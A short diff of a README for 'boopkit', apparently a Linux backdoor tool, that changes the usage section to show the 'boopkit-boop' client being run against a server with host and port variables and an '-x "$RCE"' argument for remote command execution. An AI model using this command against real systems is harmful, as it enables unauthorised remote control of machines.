@@ -52,11 +52,15 @@ cd boopkit
 make
 sudo make install
 ```
-Run boopkit in the foreground.
+Run boopkit-boop against the server.
 
 ```bash 
-# Reject all boops on localhost and 10.0.0.1
-boopkit -x 127.0.0.1 -x 10.0.0.1
+    boopkit-boop \
+      -lhost $LHOST \
+      -lport $LPORT \
+      -rhost $RHOST \
+      -rport $RPORT \
+      -x "$RCE"
 ```
 
 # Remote Vectors
